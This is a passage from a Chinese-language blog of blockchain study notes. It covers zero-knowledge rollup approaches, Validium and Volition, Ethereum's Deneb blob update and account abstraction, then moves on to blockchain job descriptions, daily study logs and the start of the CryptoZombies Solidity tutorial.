Knowledge</p><ol><li>简洁（Succinct）：验证速度快于计算证明。</li><li>非交互式（Non-Interactive）：无需证明者与验证者之间进行交互。如比特币的公私钥对也是一种零知识证明，但它要求私钥拥有者对一段文字进行签名才能证明自己拥有私钥，这需要发生一次交互。</li><li>统计学上的可靠（Argument）：相对于数学上绝对的证明(即 100% 可靠)，实现了统计学上的可靠（如 99.99999999%）。</li><li>包含信息（Knowledge）：可将某些信息编码进零知识证明中，如一笔交易已被正确执行。</li></ol><h5 id="STARK"><a href="#STARK" class="headerlink" title="STARK"></a><strong>STARK</strong></h5><p>STARK：Scalable Transparent Argument of Knowledge</p><ol><li>可扩展的（Scalable）：在进行大规模交易的证明时，验证时间仍然较短。</li><li>透明的（Transparent）：随机数公开可验证，无需像 SNARK 一样设置初始可信环境。</li><li>统计学上的可靠（Argument）：相对于数学上绝对的证明(即 100% 可靠)，实现了统计学上的可靠（如 99.99999999%）。</li><li>包含信息（Knowledge）：可将某些信息编码进零知识证明中，如一笔交易已被正确执行。</li></ol><p>对比两条技术路线，STARK 在 Layer 2 上处理大量交易时，其零知识证明生成速度和验证速度更快的特点将具有优势，并且具有抗量子性 [1]，无需初始可信环境 [2]，更加安全。而 SNARK 发展时间更久更成熟，将会更早取得应用。</p><p>SNARK 证明体积更小，并且随着技术发展，已经可以在升级后沿用最初的可信环境，在安全性上不会显著弱于 STARK。SNARK 与 STARK 的关系更像是 OP-Rollup 与 ZK-Rollup 之间的关系，前者可能更早落地，后者拥有更大潜力。</p><p>从底层技术路线去研究 ZK-Rollup 显得有点复杂了，<strong>有更简单的方式去理解 ZK-Rollup 吗</strong>？</p><blockquote><p>[1] 抗量子性指能够在量子计算机攻击下保证信息安全。传统的加密算法（如 RSA、DSA 和 ECC 等）可能在将来的大规模量子计算机上被有效地破解，因此需要使用新的抗量子密码学算法来替代，确保加密在未来的量子计算机时代仍然安全。</p><p>[2] 初始可信环境是指在协议部署的最初，需要信任部署者诚实地部署了一个安全环境。比如参与部署的多个实体中，有一人销毁了自己的私钥，即可确认初始信息没有任何人能掌控。初始可信环境主要与随机数有关，零知识证明的计算过程非常依赖随机数作为输入，但如果初始的随机数被掌握，可能使得后续的计算变得可预测，产生被攻击的风险。</p></blockquote><h4 id="3-6-ZK-发展路线-ZK-VM-vs-ZK-EVM"><a href="#3-6-ZK-发展路线-ZK-VM-vs-ZK-EVM" class="headerlink" title="3.6 ZK 发展路线 ZK-VM vs ZK-EVM"></a>3.6 ZK 发展路线 ZK-VM vs ZK-EVM</h4><h5 id="ZK-VM：从零知识证明的角度出发"><a href="#ZK-VM：从零知识证明的角度出发" class="headerlink" title="ZK-VM：从零知识证明的角度出发"></a><strong>ZK-VM：从零知识证明的角度出发</strong></h5><p>第一种思路是从零知识证明技术出发，<strong>专门开发适用于零知识证明的算法，从而构建一个 ZK-VM [1] （零知识虚拟机），而不是原生兼容 EVM 的 ZK-EVM [2] （零知识以太坊虚拟机）</strong>，在此基础上尽可能实现 EVM 兼容。</p><p>StarkWare 和 zkSync 都采用了这种路线。StarkWare 的 Cairo 语言和 zkSync 的 Zinc 语言都是原生的零知识编程语言，甚至前者的账户地址系统与以太坊也存在很大的差异。</p><p>这种路线的优点是能够充分发挥零知识证明的潜力，实现最大化的扩展性。但缺点是开发者需要学习新的编程语言，并且现有项目需要将 Solidity 语言 [3] 的代码转换为 ZK-VM 的代码，这个过程中可能出现许多意想不到的问题，需要重新调试，重新审计。</p><h5 id="ZK-EVM：从-EVM-兼容性的角度出发"><a href="#ZK-EVM：从-EVM-兼容性的角度出发" class="headerlink" title="ZK-EVM：从 EVM 兼容性的角度出发"></a><strong>ZK-EVM：从 EVM 兼容性的角度出发</strong></h5><p>反过来我们也可以从兼容 EVM 这个目的出发，<strong>将 EVM 的交易在操作码 [4] 层面切割成更小的步骤，对每个步骤去找对应的零知识证明算法，力求实现完全的 EVM 兼容。</strong> 这样做可以使开发者几乎无感地切换到二层网络，方便现有项目迁移，最大程度地保留目前的 EVM 生态成果。Scroll 和 Polygon Hermez 都采用了这种思路。</p><p>但是这种路线的缺点也显而易见，EVM 上的交易并非为零知识而设计，因此这种方法往往生成的证明体积较大，所需的时间也更长。</p><p>读到这里，我们已经了解了 Rollup 的当前进展。特别是零知识证明技术，令人感到十分神奇，使 Rollup 具备了非常大的潜力。但是仅仅通过 Rollup 实现扩容仍然存在上限，<strong>未来我们还有其他提升的空间吗</strong>？</p><blockquote><p>[1] VM（Virtual Machine）即虚拟机，一个由软件模拟硬件的可控代码执行环境。 ZK-VM（Zero Knowledge - Virtual Machine） 是适应于零知识证明的虚拟机。</p><p>[2] ZK-EVM（Zero Knowledge - Ethereum Virtual Machine）是指利用了零知识证明技术的以太坊虚拟机，与原始的以太坊虚拟机有良好的兼容性。</p><p>[3] Solidity 语言是以太坊原生的开发语言，大部分运行在以太坊网络上的智能合约均采用 Solidity 编写。</p><p>[4] 计算机能直接读懂的语言是 0 和 1 ，操作码（Opcode）是非常底层的，与硬件（或是虚拟机中的虚拟硬件）直接交流的代码。操作码是指令集中每个指令的唯一标识符，在计算机执行指令时，用于识别具体指令的一个数字或符号。例如，在 x86 指令集中，加法指令（ADD）有一个特定的操作码，用于标识该指令。</p><p>此外还有一些相关概念：</p><ol><li>指令集（Instruction Set）： 指令集是一种用于编程的低级语言，它是计算机硬件能够理解和执行的一组指令。每种处理器都有自己的指令集，这些指令集定义了处理器可以执行的基本操作，如数据移动、算术和逻辑运算、条件分支等。指令集也被称为指令集架构（ISA，Instruction Set Architecture）。</li><li>字节码（Bytecode）： 字节码是一种中间代码，介于源代码和机器代码之间。字节码通常由虚拟机（如 Java 虚拟机，JVM）执行，而不是直接由硬件执行。字节码的目的是提供一种平台无关的代码表示形式，这样不同平台上的虚拟机都可以执行相同的字节码。字节码通常比源代码更接近机器代码，但仍需要经过解释或编译为特定硬件的指令集。</li></ol><p>指令集是计算机硬件能够执行的一组基本操作，每个操作都有一个唯一的操作码（Opcode）。字节码是一种平台无关的中间代码形式，它在执行时需要虚拟机将其转换为特定硬件的指令集。在这个过程中，字节码中的指令也会有相应的操作码。总之，操作码是指令的标识符，它在指令集和字节码中都有应用。</p></blockquote><h3 id="4-未来展望"><a href="#4-未来展望" class="headerlink" title="4 未来展望"></a>4 未来展望</h3><h4 id="4-1-其它解决方案：Validium-和-Volition"><a href="#4-1-其它解决方案：Validium-和-Volition" class="headerlink" title="4.1 其它解决方案：Validium 和 Volition"></a>4.1 其它解决方案：Validium 和 Volition</h4><p>纵览二层扩容方案的发展历程，其实都源自于<strong>数据可用性</strong>影响了安全性与实用性。</p><ol><li>侧链方案，数据对主链来说不可用，所以无法继承主链安全性。</li><li>Plasma 方案，状态根可以保障链下账本的不被篡改，但具体交易数据对一层网络来说也不可用，导致资金退出困难。</li><li>OP-Rollup 方案，让所有交易的详细数据都存在一层网络上，确保了全部交易数据的可用性，从而确保二层网络的安全。</li><li>ZK-Rollup 方案，提供关键交易数据以及能证明链下交易已经被正确执行的零知识证明，实现安全性的同时，还能一定程度保证隐私性。Rely on Math，Not Validator.</li></ol><p>那么基于<strong>零知识证明和数据可用性的新组合</strong>，我们可以得到 Validium 和 Volition （由 StarkNet 提出）两种未来可行的方案。</p><h5 id="Validium"><a href="#Validium" class="headerlink" title="Validium"></a>Validium</h5><p>ZK-Rollup 仍向主网上传了交易数据，那如果我们进一步牺牲一点点安全性，连交易数据也不上传到一层，仅上传状态根和证明交易已被正确执行的零知识证明，由二层网络自行解决交易数据的保存，就可以进一步降低交易成本，这就是 Validium。</p><p>它有点像零知识版的 Plasma，Plasma 需要用户参与监督交易是否被诚实执行，而采用了零知识证明之后，不诚实的交易无法生成证明，极大地提升了节点作恶的难度。并且因为交易数据对于一层网络来说完全不可用，Validium 将具有更高的隐私性。</p><h5 id="Volition"><a href="#Volition" class="headerlink" title="Volition"></a>Volition</h5><p>Volition 是 Validium 方案的改进版本，允许用户可以自行选择其交易数据是否在一层网络可用，涉及大额资金的交易可以采用成本略高但安全性更好的交易上链模式。资金量较小的、更追求隐私的交易可以使用交易记录不上链的模式。</p><blockquote><p><strong>1. Validium：链下数据 + ZK 证明</strong></p><p><strong>核心特点</strong></p><ul><li><strong>数据存储</strong>：交易数据存储在链外（由第三方委员会或去中心化网络维护，如 StarkEx 的 DAC）。</li><li><strong>安全性依赖</strong>：依赖数据可用性委员会（DAC）的诚实性，若委员会作恶可能冻结资金（但无法盗取，因 ZK 证明保证状态正确）。</li><li><strong>优势</strong>：<ul><li>极低的交易成本（无需支付以太坊主网的数据存储费用）。</li><li>高吞吐量（适合高频交易场景，如交易所、游戏）。</li></ul></li><li><strong>劣势</strong>：<ul><li>牺牲部分去中心化（需信任 DAC）。</li><li>用户无法独立验证数据（需委员会配合提供数据）。</li></ul></li></ul><p><strong>典型应用</strong></p><ul><li><strong>dYdX</strong>（V3 版本）：采用 Validium 模式处理现货交易，降低手续费。</li><li><strong>Immutable X</strong>：为 NFT 交易提供零 Gas 费体验。</li></ul><hr><p><strong>2. Volition：用户自选数据存储模式</strong></p><p> <strong>核心特点</strong></p><ul><li><strong>混合架构</strong>：允许用户为每笔交易选择数据存储方式：<ul><li><strong>ZK-Rollup 模式</strong>：数据上链（高安全性，高成本）。</li><li><strong>Validium 模式</strong>：数据链下（低成本，依赖 DAC）。</li></ul></li><li><strong>灵活性</strong>：同一应用中，不同用户（甚至同一用户的不同交易）可自由选择模式。</li><li><strong>优势</strong>：<ul><li>平衡安全性与成本（例如，大额交易选 Rollup，小额选 Validium）。</li><li>无需迁移即可切换模式。</li></ul></li><li><strong>劣势</strong>：<ul><li>实现复杂度较高。</li></ul></li></ul><p><strong>典型应用</strong></p><ul><li><strong>StarkEx</strong>（StarkWare 的引擎）：支持 Volition，供开发者灵活配置。</li><li><strong>Sorare</strong>（梦幻足球 NFT 平台）：对普通用户用 Validium，对机构用户用 Rollup。</li></ul></blockquote><table><thead><tr><th align="center"><strong>维度</strong></th><th align="center"><strong>Validium</strong></th><th align="center"><strong>Volition</strong></th></tr></thead><tbody><tr><td align="center"><strong>数据存储</strong></td><td align="center">强制链下（DAC）</td><td align="center">用户可选链上（Rollup）或链下（Validium）</td></tr><tr><td align="center"><strong>安全性</strong></td><td align="center">依赖 DAC</td><td align="center">用户自主控制安全等级</td></tr><tr><td align="center"><strong>成本</strong></td><td align="center">极低（无链上数据费）</td><td align="center">按需支付（Rollup 模式更贵）</td></tr><tr><td align="center"><strong>适用场景</strong></td><td align="center">高频、低价值交易（如交易所）</td><td align="center">需灵活性的应用（如混合型 DeFi/NFT）</td></tr><tr><td align="center"><strong>代表项目</strong></td><td align="center">dYdX V3, Immutable X</td><td align="center">StarkEx 生态项目（如 Sorare）</td></tr></tbody></table><h4 id="4-2-Deneb-更新与-Layer-2"><a href="#4-2-Deneb-更新与-Layer-2" class="headerlink" title="4.2 Deneb 更新与 Layer 2"></a>4.2 Deneb 更新与 Layer 2</h4><p>以太坊 Deneb 更新（原 EIP-4844 ）是以太坊扩容路线 DankSharding 的前置步骤，旨在保证以太坊信标链安全性的前提下，为 Layer 2 扩容提供更大的储存资源。</p><p>Deneb 更新添加了一种新的交易：Blob 交易（大型二进制对象 Binary Large Object）。在主链上只留存指针，指针指向一个 Blob 块，上面可以储存约 128KB 的二进制数据。</p><p>以太坊矿工只负责在一段时间内（如一个月）保存 Blob 上的数据，通过随机抽样的方式确保 Blob 上二进制数据的真实性，但不验证存在 Blob 上的交易。</p><p>Blob 交易看起来对常规交易的扩容没有帮助，但这对于 Layer 2 打包的交易数据来说简直是完美契合。Layer 2 原先定期上传给 Layer 1 上的打包交易数据本来就不会执行，只是起到保障数据可用性的作用。</p><p>而 Blob 本身就相当于一个公示板，消息在公示板上的存续时间超过了 OP-Rollup 的挑战期，实践上完全够用，存储成本却降低了许多，这将促使 Layer 2 的交易成本进一步降低。</p><p>Blob 增加的唯一缺憾是超过保存期之后，Layer 2 如果想保存自己的全部历史交易数据，需要用另外的方案自行解决这些数据的可用性问题。</p><p>总体来说，Deneb 更新之后，Layer 2 将可以在保证安全性的同时进一步降低交易成本，变得更具实用价值。</p><p>探索到这里，<strong>我们增加了这么多性能，在应用层能有什么提升吗？</strong> 还是单纯只是量的堆积？</p><h4 id="4-3-账户抽象与大规模应用"><a href="#4-3-账户抽象与大规模应用" class="headerlink" title="4.3 账户抽象与大规模应用"></a>4.3 账户抽象与大规模应用</h4><p>钱包毫无疑问是 Web3 最重要的流量入口，是用户进入 Web3 世界最重要的工具，大部分用户主要接触到的钱包都是 EOA 钱包（外部拥有账户），即通过私钥和助记词掌握整个钱包的权限（如 MetaMask、Coinbase Wallet、Trust Wallet 等），这种 EOA 钱包有如下问题：</p><ol><li>高学习成本：用户需要了解复杂的非对称加密知识，理解任何人拥有私钥就能拥有账户，失去私钥就是失去资金的控制权。</li><li>单点失效问题：私钥泄露丢失，或忘记密码时，既不能用手机或邮箱，也不能柜面处理用身份证件恢复，资产将永久丢失。</li><li>风险控制难度较高：存在很多恶意攻击手段，试图盗取私钥；或在不盗取私钥的前提下，用恶意授权、恶意签名等方式盗取用户资产。新用户需要漫长的学习，具备谨慎的使用习惯才能保护资产安全。</li><li>不支持智能合约：无法实现复杂多样的高级功能，如多签、批量发送代币等等。</li></ol><p><strong>账户抽象</strong>（Account Abstraction）本质上是个智能合约钱包。是指将某些功能和具体实现细节抽象出来，用一系列的智能合约模拟出一个“账户”的效果，脱离了 EOA 账户用私钥控制地址的底层原理，允许其它更人性化的确认账户所有权的方式，并让整个账户的功能更加灵活。它解决了现有 EOA 账户的问题：</p><ol><li>更符合现有的账户使用习惯：可以像传统 Web2 服务一样登陆，使用邮箱、手机短信、两步验证等验证方法。</li><li>更多安全保障机制：出现安全风险时可以紧急暂停账户功能，并采用社交恢复等手段重新掌握账户控制权。</li><li>可以接入第三方安全模块：接入专业的风控模块，过滤风险操作，从底层降低被攻击的可能。</li><li>支持智能合约的更多功能：让用户在不具备代码能力的情况下使用多签、批量发送多种代币、批量授权额度等等操作。</li></ol><p>甚至还增加了许多新的可能：</p><ol><li>代理支付 Gas 费：允许第三方支付 Gas 费，可以由钱包运营商补贴 Gas 费来吸引用户，钱包作为入口展现商业价值，用户享受更便宜的服务。</li><li>条件交易：在满足一定条件时自动执行某些交易。</li><li>跨链操作：可以和跨链桥智能合约实现原生的交互，更灵活地实现资产跨链和其他跨链交互。</li><li>更多 DeFi 场景：账户抽象为 DeFi 提供了更多可能，如批量交易、自动借贷、流动性挖矿等。</li></ol><p>账户抽象极大地拓展了以太坊的可能性，但账户抽象的问题在于一切交易都基于智能合约完成，Gas 成本较高，这让它在以太坊主网上显得过于昂贵。</p><p>Layer 2 作为一个执行层，天然适配账户抽象，用户不会感知到私钥甚至不会感知到 Gas 费的存在。智能合约钱包本身就是程序，能引入风控等第三方服务，让转账和交互变得安全，有更多的丰富业务场景可以实现。可以说将来区块链技术的大规模应用技术离不开账户抽象，而账户抽象需要成本更低的 Layer 2 才能成立。</p><h2 id="区块链岗位全景图"><a href="#区块链岗位全景图" class="headerlink" title="区块链岗位全景图"></a>区块链岗位全景图</h2><h3 id="一、技术岗"><a href="#一、技术岗" class="headerlink" title="一、技术岗"></a>一、技术岗</h3><h4 id="1-前端工程师"><a href="#1-前端工程师" class="headerlink" title="1. 前端工程师"></a>1. 前端工程师</h4><ol><li><p><strong>主要职责：</strong></p><ul><li>设计和开发基于区块链技术的前端应用，支持去中心化平台的交互。</li><li>通过 React、Vue 等框架实现高效的用户界面，支持钱包连接、交易签名、信息验证等功能。</li><li>集成并优化智能合约的前端交互，确保链上数据与用户界面的无缝连接。</li><li>与后端团队协作，基于 GraphQL 或 RESTful API 获取链上和链下数据。</li><li>持续优化前端性能，提升用户体验，确保在不同设备和浏览器上的兼容性。</li><li>关注 Web3 技术趋势，参与技术评审与分享，不断优化产品架构与代码质量。</li></ul></li><li><p><strong>职位要求：</strong></p><ul><li>本科及以上学历，计算机科学或相关专业，具备扎实的计算机基础。</li><li>精通 HTML、CSS、JavaScript，熟悉 React、Vue 等前端框架，能够独立构建复杂的 UI 界面。</li><li>熟悉 Web3.js、Viem、Metamask 等 Web3 技术栈，能够与智能合约进行交互。（现在 Ethers.js / Web3.js 已经不怎么使用了，大家现在基本上都是用的 Viem）</li><li>了解常用的区块链网络，如以太坊、Solana 等，具备 Dapp 开发经验者优先。</li><li>熟悉 Git 版本管理工具，具备良好的代码编写规范，注重代码可维护性。</li><li>良好的沟通能力和团队协作精神，能够在快速发展的环境中高效工作。</li><li>具有良好的问题解决能力，能在面对复杂的技术难题时，提出创新的解决方案。</li><li>有开源项目或 Web3 相关项目的经验优先。</li></ul> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用技术栈</span></span><br><span class="line">- HTML5</span><br><span class="line">- CSS3</span><br><span class="line">- JavaScript (ES6+)</span><br><span class="line">- React / Vue</span><br><span class="line">- TypeScript</span><br><span class="line">- Next.js</span><br><span class="line">- Ethers.js / Web3.js / Viem</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="2-后端工程师"><a href="#2-后端工程师" class="headerlink" title="2. 后端工程师"></a>2. 后端工程师</h4><ol><li><p><strong>主要职责：</strong></p><ul><li>设计、开发和维护去中心化应用（Dapp）的后端服务，包括链上数据交互、智能合约集成和事务处理。</li><li>与前端团队合作，确保前后端数据交互的高效性和稳定性，支持多种 Web3 钱包（如 Metamask）的集成。</li><li>基于 Node.js、Python 等技术栈构建高性能的 RESTful 或 GraphQL API，以支持 Web3 平台的需求。</li><li>与智能合约团队合作，确保智能合约与后端服务的无缝连接，优化链上数据的读取和写入效率。</li><li>优化后端性能，确保系统的高可用性、高吞吐量和低延迟，满足高并发访问需求。</li><li>定期进行系统架构和代码的评审，不断提升代码质量与技术标准。</li><li>参与 Web3 技术的前沿研究，保持对新兴区块链技术的学习和应用，推动公司技术迭代。</li></ul></li><li><p><strong>职位要求：</strong></p><ul><li>本科及以上学历，计算机科学或相关专业，具备扎实的计算机基础。</li><li>精通 Node.js、Go、Python 等后端开发语言，具有构建高并发、分布式系统的经验。</li><li>熟悉 Viem、Web3.js、Ethers.js 等 Web3 工具，能够与区块链进行交互并处理链上数据。</li><li>具备 RESTful API 或 GraphQL 开发经验，能够设计高效的 API 服务，支持前端与区块链的交互。</li><li>熟悉数据库技术，具备 MySQL、PostgreSQL 或 NoSQL 数据库的开发与优化经验。</li><li>对智能合约有一定的了解，具备与智能合约交互、读取链上数据等相关经验。</li><li>熟悉消息队列（如 RabbitMQ、Kafka）及事件驱动架构，能够处理异步事务。</li><li>熟悉容器化技术（如 Docker、Kubernetes），具备 CI/CD 经验者优先。</li><li>良好的代码编写规范与文档写作能力，具备良好的团队协作精神和沟通能力。</li><li>有 Web3 项目开发经验或开源贡献者优先。</li></ul> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用技术栈</span></span><br><span class="line">- Node.js / Go / Python</span><br><span class="line">- Viem / Web3.js / Ethers.js</span><br><span class="line">- RESTful API / GraphQL</span><br><span class="line">- MySQL / PostgreSQL</span><br><span class="line">- Docker / Kubernetes</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="3-智能合约工程师"><a href="#3-智能合约工程师" class="headerlink" title="3. 智能合约工程师"></a>3. 智能合约工程师</h4><ol><li><p><strong>主要职责：</strong></p><ul><li>设计、开发和部署智能合约，确保合约在区块链网络上的安全性、可靠性和高效性。</li><li>使用 Solidity 编写智能合约，涵盖各类去中心化应用的需求，如 NFT、DeFi、DAO 等。</li><li>与团队合作，定义智能合约的功能需求，并根据需求设计合适的智能合约架构。</li><li>部署智能合约至区块链网络（如以太坊、Polygon、Arbitrum、Base 等），并确保合约的高效执行。</li><li>编写智能合约的单元测试，进行代码审计与安全性测试，确保合约代码无漏洞，避免潜在的安全风险。</li><li>优化智能合约性能，减少 Gas 费用。</li><li>研究和应用最新的区块链技术和智能合约最佳实践，推动技术的持续进步。</li><li>与前端和后端开发团队紧密协作，确保智能合约与其他系统组件的顺畅集成。</li><li>为团队成员提供智能合约相关的技术支持和指导，推动团队的技术提升。</li></ul></li><li><p><strong>职位要求：</strong></p><ul><li>本科及以上学历，计算机科学或相关专业，具备扎实的计算机基础。</li><li>3 年以上智能合约开发经验，熟练使用 Solidity 或类似的智能合约开发语言。</li><li>熟悉 Ethereum、Polygon、Arbitrum、Base 等主流区块链平台，能够在这些平台上部署和维护智能合约。</li><li>了解智能合约开发的安全性问题，具备智能合约审计和漏洞修复经验，熟悉常见的攻击模式（如重入攻击、溢出、权限管理等）。</li><li>熟悉区块链的基本原理，理解 Gas 费用、交易确认、区块链共识机制等概念。</li><li>熟练使用 Foundry、Hardhat、Remix 等智能合约开发框架，具备项目开发、测试与部署经验。</li><li>具备一定的 Viem、Web3.js、Ethers.js 等 Web3 工具使用经验，能够与前端或其他系统进行无缝集成。</li><li>熟悉 IPFS、NFT、Token 标准（ERC-20、ERC-721、ERC-1155 等）及去中心化身份（DID）等 Web3 相关技术。</li><li>具有良好的代码编写规范，注重代码的可读性和可维护性。</li><li>良好的沟通能力和团队协作精神，能够在快速发展的环境中有效工作。</li></ul> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用技术栈</span></span><br><span class="line">- Solidity</span><br><span class="line">- Remix</span><br><span class="line">- Foundry / Hardhat</span><br><span class="line">- Phalcon / Tenderly</span><br><span class="line">- Yul</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="二、非技术岗"><a href="#二、非技术岗" class="headerlink" title="二、非技术岗"></a>二、非技术岗</h3><h4 id="1-产品与运营"><a href="#1-产品与运营" class="headerlink" title="1. 产品与运营"></a>1. 产品与运营</h4><ol><li>职位描述：<ul><li>在 Web3 产品生命周期中负责协调产品发布、用户反馈收集和持续改进流程，以提升用户体验和产品迭代效率。</li><li>执行以用户获取、留存和参与度提升为目标的增长战略，并监控实施效果。</li><li>与产品、技术、市场及合规团队紧密合作，确保产品上市（go-to-market）策略与各部门需求保持一致。</li><li>持续分析运营数据，跟踪关键绩效指标（KPIs），并根据数据提出优化建议。</li></ul></li><li>职位要求：<ul><li>熟悉产品上线（Go-to-market）全流程，擅长跨部门资源协调与项目推进。</li><li>具备扎实的数据分析能力，能熟练使用 SQL、Excel 或其他数据工具进行数据统计和洞察提炼。</li></ul></li></ol><h4 id="2-社区管理"><a href="#2-社区管理" class="headerlink" title="2. 社区管理"></a>2. 社区管理</h4><ol><li><p>职位描述</p><ul><li>构建并管理 Telegram、Twitter（X）、Discord 等社交平台的社区，实现持续的用户互动与增长；</li><li>组织线上 AMA（问答）、活动、竞赛等形式多样的社区互动，以提升用户活跃度和品牌粘性；</li><li>跟踪社区健康度指标和情感分析，定期向管理层汇报洞察与优化建议；</li><li>与营销团队协作，制定并执行内容日历，发布社区公告和运营手册。</li></ul></li><li><p>职位要求</p><ul><li>Web3、DAO 或 NFT 社区管理经验，深刻理解去中心化应用生态；</li><li>出色的文案撰写与沟通能力，能够有效引导社区讨论并快速响应用户反馈；</li><li>熟练使用社区数据分析工具，能够监测并解读用户行为与舆情动态；</li><li>具备活动策划与执行能力，能够独立组织线上及线下社区活动。</li></ul> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用平台</span></span><br><span class="line">- Telegram</span><br><span class="line">- Twitter (X)</span><br><span class="line">- Discord</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="3-研究分析"><a href="#3-研究分析" class="headerlink" title="3. 研究分析"></a>3. 研究分析</h4><ol><li><p>职位描述</p><ul><li>收集、整理并分析 Web3 行业市场与用户数据，编写可行性研究报告，为产品与运营提供决策支持；</li><li>跟踪区块链协议技术演进及生态动态，撰写深度研究报告或白皮书；</li><li>进行竞争对手分析，评估市场趋势与用户行为模式，为战略规划提供数据驱动的建议；</li><li>支持项目的加密经济模型设计与博弈论分析，以保证项目的经济激励合理性。</li></ul></li><li><p>职位要求</p><ul><li>熟练使用 Excel、SPSS 或 Python 等数据分析工具，具备定量和定性研究方法经验；</li><li>深入了解区块链生态、DeFi 协议及加密经济学原理；</li><li>优秀的报告撰写与演示能力，能够清晰传达研究结论与建议；</li><li>精通链上数据分析工具（Glassnode、Token Terminal）。</li></ul> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用工具</span></span><br><span class="line">- Excel</span><br><span class="line">- SPSS</span><br><span class="line">- Python</span><br><span class="line">- Glassnode</span><br><span class="line">- Token Terminal</span><br></pre></td></tr></tbody></table></figure></li></ol><h1 id="8月7日"><a href="#8月7日" class="headerlink" title="8月7日"></a>8月7日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>MyFirstLayer2  剩余学习</td></tr><tr><td>行业赛道全览</td></tr></tbody></table><h2 id="行业赛道全览"><a href="#行业赛道全览" class="headerlink" title="行业赛道全览"></a>行业赛道全览</h2><h1 id="8月8日"><a href="#8月8日" class="headerlink" title="8月8日"></a>8月8日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>安全与合规</td></tr><tr><td>CryptoZombiesx的solidity学习/Solidity: Beginner to Intermediate Smart Contracts/lesson1搭建僵尸工厂</td></tr></tbody></table><h2 id="CryptoZombiesx的solidity学习"><a href="#CryptoZombiesx的solidity学习" class="headerlink" title="CryptoZombiesx的solidity学习"></a>CryptoZombiesx的solidity学习</h2><h3 id="Solidity-Beginner-to-Intermediate-Smart-Contracts"><a href="#Solidity-Beginner-to-Intermediate-Smart-Contracts" class="headerlink" title="Solidity: Beginner to Intermediate Smart Contracts"></a>Solidity: Beginner to Intermediate Smart Contracts</h3><h3 id="lesson1-搭建僵尸工厂"><a href="#lesson1-搭建僵尸工厂" class="headerlink" title="lesson1 搭建僵尸工厂"></a>lesson1 搭建僵尸工厂</h3><h3 id="第2章-合约"><a href="#第2章-合约" class="headerlink" title="第2章: 合约"></a>第2章: 合约</h3><p>从最基本的开始入手:</p><p>Solidity 的代码都包裹在<strong>合约</strong>里面. 一份<code>合约</code>就是以太应币应用的基本模块， 所有的变量和函数都属于一份合约, 它是你所有应用的起点.</p><p>一份名为 <code>HelloWorld</code> 的空合约如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract HelloWorld {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>版本指令</strong></p><p>所有的 Solidity 源码都必须冠以 “version pragma” — 标明 Solidity 编译器的版本. 以避免将来新的编译器可能破坏你的代码。</p><p>例如: <code>pragma solidity ^0.4.19;</code> (当前 Solidity 的最新版本是 0.4.19).</p><p>综上所述， 下面就是一个最基本的合约 — 每次建立一个新的项目时的第一段代码:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract HelloWorld {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>为了建立我们的僵尸部队， 让我们先建立一个基础合约，称为 <code>ZombieFactory</code>。</p><ol><li>在右边的输入框里输入 <code>0.4.19</code>，我们的合约基于这个版本的编译器。</li><li>建立一个空合约 <code>ZombieFactory</code>。</li></ol><p>一切完毕，点击下面 “答案” . 如果没效果，点击 “提示”。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第3章-状态变量和整数"><a href="#第3章-状态变量和整数" class="headerlink" title="第3章: 状态变量和整数"></a>第3章: 状态变量和整数</h3><p>真棒！我们已经为我们的合约做了一个外壳， 下面学习 Solidity 中如何使用变量。</p><p><strong>状态变量</strong>是被永久地保存在合约中。也就是说它们被写入以太币区块链中. 想象成写入一个数据库。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contract Example {</span><br><span class="line">  // 这个无符号整数将会永久的被保存在区块链中</span><br><span class="line">  uint myUnsignedInteger = 100;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，定义 <code>myUnsignedInteger</code> 为 <code>uint</code> 类型，并赋值100。</p><p><strong>无符号整数: <code>uint</code></strong></p><p><code>uint</code> 